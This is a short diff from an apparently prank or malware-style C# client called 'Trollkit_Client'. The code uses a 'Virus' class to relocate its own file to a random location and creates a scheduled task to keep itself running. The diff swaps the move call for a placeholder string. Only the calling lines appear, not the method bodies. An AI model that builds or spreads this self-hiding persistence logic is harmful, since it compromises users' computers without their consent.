@@ -36,7 +36,7 @@ namespace Trollkit_Client
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
-			string newFileLocation = virus.MoveFileToLocation(randomLocation);
+			string newFileLocation = "lekker";// virus.MoveFileToLocation(randomLocation);
 			BConsole.WriteLine($"New File location: {newFileLocation}");
 			new TaskSchedulerHelper().CreateTask(newFileLocation);
 
